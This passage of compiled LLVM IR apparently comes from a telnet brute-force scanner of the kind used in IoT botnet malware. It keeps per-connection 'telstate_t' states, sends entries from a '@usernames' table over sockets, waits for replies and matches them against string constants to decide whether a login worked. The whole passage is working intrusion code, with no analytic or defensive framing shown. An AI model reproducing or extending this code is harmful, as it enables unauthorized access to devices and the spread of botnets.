; <label>:638:                                    ; preds = %617
  %639 = load i32, i32* %2, align 4
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %640
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %641, i32 0, i32 8
  %643 = load i8*, i8** %642, align 8
  call void @llvm.memset.p0i8.i64(i8* %643, i8 0, i64 1024, i32 1, i1 false)
  br label %644

; <label>:644:                                    ; preds = %638, %633
  %645 = load i32, i32* %2, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 2
  store i8 3, i8* %648, align 8
  br label %2316

; <label>:649:                                    ; preds = %598
  %650 = load i32, i32* %2, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 0
  %654 = load i32, i32* %653, align 16
  %655 = load i32, i32* %2, align 4
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 8
  %659 = load i8*, i8** %658, align 8
  %660 = load i32, i32* %2, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 7
  %664 = load i16, i16* %663, align 16
  %665 = zext i16 %664 to i32
  %666 = call i32 @readUntil(i32 %654, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %659, i32 1024, i32 %665)
  %667 = icmp ne i32 %666, 0
  br i1 %667, label %668, label %700

; <label>:668:                                    ; preds = %649
  %669 = load i32, i32* %2, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %670
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %671, i32 0, i32 6
  store i32 0, i32* %672, align 4
  %673 = load i32, i32* %2, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 7
  store i16 0, i16* %676, align 16
  %677 = load i32, i32* %2, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %678
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %679, i32 0, i32 8
  %681 = load i8*, i8** %680, align 8
  %682 = call i8* @strstr(i8* %681, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %683 = icmp ne i8* %682, null
  br i1 %683, label %684, label %689

; <label>:684:                                    ; preds = %668
  %685 = load i32, i32* %2, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %686
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %687, i32 0, i32 2
  store i8 5, i8* %688, align 8
  br label %695

; <label>:689:                                    ; preds = %668
  %690 = load i32, i32* %2, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %691
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %692, i32 0, i32 8
  %694 = load i8*, i8** %693, align 8
  call void @llvm.memset.p0i8.i64(i8* %694, i8 0, i64 1024, i32 1, i1 false)
  br label %695

; <label>:695:                                    ; preds = %689, %684
  %696 = load i32, i32* %2, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %697
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %698, i32 0, i32 2
  store i8 3, i8* %699, align 8
  br label %2316

; <label>:700:                                    ; preds = %649
  %701 = load i32, i32* %2, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 8
  %705 = load i8*, i8** %704, align 8
  %706 = call i64 @strlen(i8* %705) #10
  %707 = trunc i64 %706 to i16
  %708 = load i32, i32* %2, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 7
  store i16 %707, i16* %711, align 16
  br label %712

; <label>:712:                                    ; preds = %700
  br label %713

; <label>:713:                                    ; preds = %712
  br label %714

; <label>:714:                                    ; preds = %713
  br label %715

; <label>:715:                                    ; preds = %714
  br label %716

; <label>:716:                                    ; preds = %715
  %717 = load i32, i32* %2, align 4
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %718
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %719, i32 0, i32 6
  %721 = load i32, i32* %720, align 4
  %722 = sub i32 %721, 1290402559
  %723 = add i32 %722, 10
  %724 = add i32 %723, 1290402559
  %725 = add i32 %721, 10
  %726 = zext i32 %724 to i64
  %727 = call i64 @time(i64* null) #2
  %728 = icmp slt i64 %726, %727
  br i1 %728, label %729, label %744

; <label>:729:                                    ; preds = %716
  %730 = load i32, i32* %2, align 4
  %731 = sext i32 %730 to i64
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %731
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %732, i32 0, i32 0
  %734 = load i32, i32* %733, align 16
  %735 = call i32 @sclose(i32 %734)
  %736 = load i32, i32* %2, align 4
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %737
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %738, i32 0, i32 2
  store i8 0, i8* %739, align 8
  %740 = load i32, i32* %2, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %741
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %742, i32 0, i32 3
  store i8 1, i8* %743, align 1
  br label %744

; <label>:744:                                    ; preds = %729, %716
  br label %2315

; <label>:745:                                    ; preds = %71
  %746 = load i32, i32* %2, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 0
  %750 = load i32, i32* %749, align 16
  %751 = load i32, i32* %2, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 4
  %755 = load i8, i8* %754, align 2
  %756 = zext i8 %755 to i64
  %757 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %756
  %758 = load i8*, i8** %757, align 8
  %759 = load i32, i32* %2, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %760
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %761, i32 0, i32 4
  %763 = load i8, i8* %762, align 2
  %764 = zext i8 %763 to i64
  %765 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %764
  %766 = load i8*, i8** %765, align 8
  %767 = call i64 @strlen(i8* %766) #10
  %768 = call i64 @send(i32 %750, i8* %758, i64 %767, i32 16384)
  %769 = icmp slt i64 %768, 0
  br i1 %769, label %770, label %785

; <label>:770:                                    ; preds = %745
  %771 = load i32, i32* %2, align 4
  %772 = sext i32 %771 to i64
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %772
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %773, i32 0, i32 0
  %775 = load i32, i32* %774, align 16
  %776 = call i32 @sclose(i32 %775)
  %777 = load i32, i32* %2, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %779, i32 0, i32 2
  store i8 0, i8* %780, align 8
  %781 = load i32, i32* %2, align 4
  %782 = sext i32 %781 to i64
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %782
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %783, i32 0, i32 3
  store i8 1, i8* %784, align 1
  br label %2316

; <label>:785:                                    ; preds = %745
  %786 = load i32, i32* %2, align 4
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %787
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %788, i32 0, i32 0
  %790 = load i32, i32* %789, align 16
  %791 = call i64 @send(i32 %790, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %792 = icmp slt i64 %791, 0
  br i1 %792, label %793, label %808

; <label>:793:                                    ; preds = %785
  %794 = load i32, i32* %2, align 4
  %795 = sext i32 %794 to i64
  %796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %795
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %796, i32 0, i32 0
  %798 = load i32, i32* %797, align 16
  %799 = call i32 @sclose(i32 %798)
  %800 = load i32, i32* %2, align 4
  %801 = sext i32 %800 to i64
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %801
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %802, i32 0, i32 2
  store i8 0, i8* %803, align 8
  %804 = load i32, i32* %2, align 4
  %805 = sext i32 %804 to i64
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %805
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %806, i32 0, i32 3
  store i8 1, i8* %807, align 1
  br label %2316

; <label>:808:                                    ; preds = %785
  %809 = load i32, i32* %2, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 2
  store i8 4, i8* %812, align 8
  br label %2315

; <label>:813:                                    ; preds = %71
  %814 = load i32, i32* %2, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 6
  %818 = load i32, i32* %817, align 4
  %819 = icmp eq i32 %818, 0
  br i1 %819, label %820, label %827

; <label>:820:                                    ; preds = %813
  %821 = call i64 @time(i64* null) #2
  %822 = trunc i64 %821 to i32
  %823 = load i32, i32* %2, align 4
  %824 = sext i32 %823 to i64
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %824
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %825, i32 0, i32 6
  store i32 %822, i32* %826, align 4
  br label %827

; <label>:827:                                    ; preds = %820, %813
  %828 = load i32, i32* %2, align 4
  %829 = sext i32 %828 to i64
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %829
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %830, i32 0, i32 0
  %832 = load i32, i32* %831, align 16
  %833 = load i32, i32* %2, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 8
  %837 = load i8*, i8** %836, align 8
  %838 = load i32, i32* %2, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 7
  %842 = load i16, i16* %841, align 16
  %843 = zext i16 %842 to i32
  %844 = call i32 @readUntil(i32 %832, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %837, i32 1024, i32 %843)
  %845 = icmp ne i32 %844, 0
  br i1 %845, label %846, label %878

; <label>:846:                                    ; preds = %827
  %847 = load i32, i32* %2, align 4
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %848
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %849, i32 0, i32 6
  store i32 0, i32* %850, align 4
  %851 = load i32, i32* %2, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %852
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %853, i32 0, i32 7
  store i16 0, i16* %854, align 16
  %855 = load i32, i32* %2, align 4
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %856
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %857, i32 0, i32 8
  %859 = load i8*, i8** %858, align 8
  %860 = call i8* @strstr(i8* %859, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0)) #10
  %861 = icmp ne i8* %860, null
  br i1 %861, label %862, label %867

; <label>:862:                                    ; preds = %846
  %863 = load i32, i32* %2, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %864
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %865, i32 0, i32 2
  store i8 5, i8* %866, align 8
  br label %872

; <label>:867:                                    ; preds = %846
  %868 = load i32, i32* %2, align 4
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %869
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %870, i32 0, i32 2
  store i8 7, i8* %871, align 8
  br label %872

; <label>:872:                                    ; preds = %867, %862
  %873 = load i32, i32* %2, align 4
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %874
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %875, i32 0, i32 8
  %877 = load i8*, i8** %876, align 8
  call void @llvm.memset.p0i8.i64(i8* %877, i8 0, i64 1024, i32 1, i1 false)
  br label %2316

; <label>:878:                                    ; preds = %827
  %879 = load i32, i32* %2, align 4
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %880
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %881, i32 0, i32 0
  %883 = load i32, i32* %882, align 16
  %884 = load i32, i32* %2, align 4
  %885 = sext i32 %884 to i64
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %885
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %886, i32 0, i32 8
  %888 = load i8*, i8** %887, align 8
  %889 = load i32, i32* %2, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %890
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %891, i32 0, i32 7
  %893 = load i16, i16* %892, align 16
  %894 = zext i16 %893 to i32
  %895 = call i32 @readUntil(i32 %883, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %888, i32 1024, i32 %894)
  %896 = icmp ne i32 %895, 0
  br i1 %896, label %897, label %929

; <label>:897:                                    ; preds = %878
  %898 = load i32, i32* %2, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %899
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %900, i32 0, i32 6
  store i32 0, i32* %901, align 4
  %902 = load i32, i32* %2, align 4
  %903 = sext i32 %902 to i64
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %903
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %904, i32 0, i32 7
  store i16 0, i16* %905, align 16
  %906 = load i32, i32* %2, align 4
  %907 = sext i32 %906 to i64
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %907
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %908, i32 0, i32 8
  %910 = load i8*, i8** %909, align 8
  %911 = call i8* @strstr(i8* %910, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0)) #10
  %912 = icmp ne i8* %911, null
  br i1 %912, label %913, label %918

; <label>:913:                                    ; preds = %897
  %914 = load i32, i32* %2, align 4
  %915 = sext i32 %914 to i64
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %915
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %916, i32 0, i32 2
  store i8 5, i8* %917, align 8
  br label %923

; <label>:918:                                    ; preds = %897
  %919 = load i32, i32* %2, align 4
  %920 = sext i32 %919 to i64
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %920
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %921, i32 0, i32 2
  store i8 7, i8* %922, align 8
  br label %923

; <label>:923:                                    ; preds = %918, %913
  %924 = load i32, i32* %2, align 4
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %925
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %926, i32 0, i32 8
  %928 = load i8*, i8** %927, align 8
  call void @llvm.memset.p0i8.i64(i8* %928, i8 0, i64 1024, i32 1, i1 false)
  br label %2316

; <label>:929:                                    ; preds = %878
  %930 = load i32, i32* %2, align 4
  %931 = sext i32 %930 to i64
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %931
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %932, i32 0, i32 8
  %934 = load i8*, i8** %933, align 8
  %935 = call i8* @strstr(i8* %934, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %936 = icmp ne i8* %935, null
  br i1 %936, label %937, label %952

; <label>:937:                                    ; preds = %929
  %938 = load i32, i32* %2, align 4
  %939 = sext i32 %938 to i64
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %939
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %940, i32 0, i32 0
  %942 = load i32, i32* %941, align 16
  %943 = call i32 @sclose(i32 %942)
  %944 = load i32, i32* %2, align 4
  %945 = sext i32 %944 to i64
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %945
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %946, i32 0, i32 2
  store i8 0, i8* %947, align 8
  %948 = load i32, i32* %2, align 4
  %949 = sext i32 %948 to i64
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %949
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %950, i32 0, i32 3
  store i8 0, i8* %951, align 1
  br label %2316

; <label>:952:                                    ; preds = %929
  %953 = load i32, i32* %2, align 4
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %954
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %955, i32 0, i32 8
  %957 = load i8*, i8** %956, align 8
  %958 = call i8* @strstr(i8* %957, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %959 = icmp ne i8* %958, null
  br i1 %959, label %960, label %975

; <label>:960:                                    ; preds = %952
  %961 = load i32, i32* %2, align 4
  %962 = sext i32 %961 to i64
  %963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %962
  %964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %963, i32 0, i32 0
  %965 = load i32, i32* %964, align 16
  %966 = call i32 @sclose(i32 %965)
  %967 = load i32, i32* %2, align 4
  %968 = sext i32 %967 to i64
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %968
  %970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %969, i32 0, i32 2
  store i8 0, i8* %970, align 8
  %971 = load i32, i32* %2, align 4
  %972 = sext i32 %971 to i64
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %972
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %973, i32 0, i32 3
  store i8 0, i8* %974, align 1
  br label %2316

; <label>:975:                                    ; preds = %952
  %976 = load i32, i32* %2, align 4
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %977
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %978, i32 0, i32 8
  %980 = load i8*, i8** %979, align 8
  %981 = call i8* @strstr(i8* %980, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %982 = icmp ne i8* %981, null
  br i1 %982, label %983, label %998

; <label>:983:                                    ; preds = %975
  %984 = load i32, i32* %2, align 4
  %985 = sext i32 %984 to i64
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %985
  %987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %986, i32 0, i32 0
  %988 = load i32, i32* %987, align 16
  %989 = call i32 @sclose(i32 %988)
  %990 = load i32, i32* %2, align 4
  %991 = sext i32 %990 to i64
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %991
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %992, i32 0, i32 2
  store i8 0, i8* %993, align 8
  %994 = load i32, i32* %2, align 4
  %995 = sext i32 %994 to i64
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %995
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %996, i32 0, i32 3
  store i8 0, i8* %997, align 1
  br label %2316

; <label>:998:                                    ; preds = %975
  %999 = load i32, i32* %2, align 4
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1000
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1001, i32 0, i32 8
  %1003 = load i8*, i8** %1002, align 8
  %1004 = call i8* @strstr(i8* %1003, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %1005 = icmp ne i8* %1004, null
  br i1 %1005, label %1006, label %1021

; <label>:1006:                                   ; preds = %998
  %1007 = load i32, i32* %2, align 4
  %1008 = sext i32 %1007 to i64
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1008
  %1010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1009, i32 0, i32 0
  %1011 = load i32, i32* %1010, align 16
  %1012 = call i32 @sclose(i32 %1011)
  %1013 = load i32, i32* %2, align 4
  %1014 = sext i32 %1013 to i64
  %1015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1014
  %1016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1015, i32 0, i32 2
  store i8 0, i8* %1016, align 8
  %1017 = load i32, i32* %2, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1018
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1019, i32 0, i32 3
  store i8 0, i8* %1020, align 1
  br label %2316

; <label>:1021:                                   ; preds = %998
  %1022 = load i32, i32* %2, align 4
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1023
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1024, i32 0, i32 8
  %1026 = load i8*, i8** %1025, align 8
  %1027 = call i8* @strstr(i8* %1026, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %1028 = icmp ne i8* %1027, null
  br i1 %1028, label %1029, label %1044

; <label>:1029:                                   ; preds = %1021
  %1030 = load i32, i32* %2, align 4
  %1031 = sext i32 %1030 to i64
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1031
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1032, i32 0, i32 0
  %1034 = load i32, i32* %1033, align 16
  %1035 = call i32 @sclose(i32 %1034)
  %1036 = load i32, i32* %2, align 4
  %1037 = sext i32 %1036 to i64
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1037
  %1039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1038, i32 0, i32 2
  store i8 0, i8* %1039, align 8
  %1040 = load i32, i32* %2, align 4
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1041
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1042, i32 0, i32 3
  store i8 0, i8* %1043, align 1
  br label %2316

; <label>:1044:                                   ; preds = %1021
  %1045 = load i32, i32* %2, align 4
  %1046 = sext i32 %1045 to i64
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1046
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1047, i32 0, i32 8
  %1049 = load i8*, i8** %1048, align 8
  %1050 = call i8* @strstr(i8* %1049, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1051 = icmp ne i8* %1050, null
  br i1 %1051, label %1052, label %1067

; <label>:1052:                                   ; preds = %1044
  %1053 = load i32, i32* %2, align 4
  %1054 = sext i32 %1053 to i64
  %1055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1054
  %1056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1055, i32 0, i32 0
  %1057 = load i32, i32* %1056, align 16
  %1058 = call i32 @sclose(i32 %1057)
  %1059 = load i32, i32* %2, align 4
  %1060 = sext i32 %1059 to i64
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1060
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1061, i32 0, i32 2
  store i8 0, i8* %1062, align 8
  %1063 = load i32, i32* %2, align 4
  %1064 = sext i32 %1063 to i64
  %1065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1064
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1065, i32 0, i32 3
  store i8 0, i8* %1066, align 1
  br label %2316

; <label>:1067:                                   ; preds = %1044
  %1068 = load i32, i32* %2, align 4
  %1069 = sext i32 %1068 to i64
  %1070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1069
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1070, i32 0, i32 8
  %1072 = load i8*, i8** %1071, align 8
  %1073 = call i8* @strstr(i8* %1072, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1074 = icmp ne i8* %1073, null
  br i1 %1074, label %1075, label %1090

; <label>:1075:                                   ; preds = %1067
  %1076 = load i32, i32* %2, align 4
  %1077 = sext i32 %1076 to i64
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1077
  %1079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1078, i32 0, i32 0
  %1080 = load i32, i32* %1079, align 16
  %1081 = call i32 @sclose(i32 %1080)
  %1082 = load i32, i32* %2, align 4
  %1083 = sext i32 %1082 to i64
  %1084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1083
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1084, i32 0, i32 2
  store i8 0, i8* %1085, align 8
  %1086 = load i32, i32* %2, align 4
  %1087 = sext i32 %1086 to i64
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1087
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1088, i32 0, i32 3
  store i8 0, i8* %1089, align 1
  br label %2316

; <label>:1090:                                   ; preds = %1067
  %1091 = load i32, i32* %2, align 4
  %1092 = sext i32 %1091 to i64
  %1093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1092
  %1094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1093, i32 0, i32 8
  %1095 = load i8*, i8** %1094, align 8
  %1096 = call i8* @strstr(i8* %1095, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1097 = icmp ne i8* %1096, null
  br i1 %1097, label %1098, label %1113

; <label>:1098:                                   ; preds = %1090
